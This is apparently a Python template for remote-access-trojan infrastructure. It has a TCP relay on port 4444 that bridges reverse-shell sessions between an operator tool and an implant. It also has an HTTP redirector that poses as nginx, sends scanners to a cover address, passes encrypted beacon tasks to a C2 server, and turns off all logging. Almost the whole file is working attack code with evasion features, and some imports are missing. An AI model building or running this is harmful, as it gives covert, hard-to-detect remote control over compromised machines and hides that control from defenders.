import socket as _socket
import threading as _threading
from http.server import ThreadingHTTPServer

# ── TCP relay ─────────────────────────────────────────────────────────────────
# Pairs two TCP connections that present the same 4-byte session token.
# Used by the reverse shell: thorn connects first, implant connects second;
# the relay bridges them so neither side needs a direct route to the other.

_relay_waiting = {}   # token → socket waiting for peer
_relay_lock    = _threading.Lock()

def _relay_bridge(src, dst):
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except OSError:
        pass
    finally:
        try: src.close()
        except: pass
        try: dst.close()
        except: pass

def _relay_accept(conn):
    """Read 4-byte token, pair with a waiting connection, then bridge."""
    try:
        token = b''
        while len(token) < 4:
            chunk = conn.recv(4 - len(token))
            if not chunk:
                conn.close()
                return
            token += chunk
    except OSError:
        conn.close()
        return

    with _relay_lock:
        if token in _relay_waiting:
            peer = _relay_waiting.pop(token)
        else:
            _relay_waiting[token] = conn
            return  # hold until peer arrives

    _threading.Thread(target=_relay_bridge, args=(conn, peer), daemon=True).start()
    _threading.Thread(target=_relay_bridge, args=(peer, conn), daemon=True).start()

def _start_relay(port=4444):
    srv = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
    srv.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', port))
    srv.listen(32)
    def _loop():
        while True:
            try:
                conn, _ = srv.accept()
                _threading.Thread(target=_relay_accept, args=(conn,), daemon=True).start()
            except OSError:
                break
    _threading.Thread(target=_loop, daemon=True).start()

_start_relay({{RELAY_PORT}})

# ── HTTP handler ──────────────────────────────────────────────────────────────

class RequestHandler(BaseHTTPRequestHandler):
    # Masquerade as nginx — hides Python fingerprint from scanners
    server_version = "nginx/1.18.0"
    sys_version    = ""

    def _cover(self):
        """Send a redirect for all non-beacon traffic."""
        body = b""
        self.send_response(301)
        self.send_header("Location", "{{COVER_REDIRECT}}")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self):
        if not self.path.startswith('/?id='):
            self._cover()
            return
        rat_id = self.path[5:]
        get_request = requests.post("{{C2_SERVER}}/api/tasks/get_task", json={"rat_id": rat_id})
        task = get_request.text
        task = Crypto.enc(task)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(task)))
        self.end_headers()
        self.wfile.write(task)

    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                raise ValueError
            post_data = self.rfile.read(content_length)
            post_data = Crypto.dec(post_data)
            task_id, task = post_data.decode().split(':', 1)
        except Exception:
            self._cover()
            return
        resp = requests.post("{{C2_SERVER}}/api/tasks/" + task_id + "/task_io", data=task)
        reply = resp.text if resp.status_code == 200 else ''
        if reply:
            reply = Crypto.enc(reply)
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(reply)))
            self.end_headers()
            self.wfile.write(reply)
        else:
            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.end_headers()

    def do_HEAD(self):    self._cover()

    # Suppress all request and error logs
    def log_message(self, fmt, *args): pass
    def log_error(self, fmt, *args):   pass

httpd = ThreadingHTTPServer(('', 80), RequestHandler)
httpd.serve_forever()
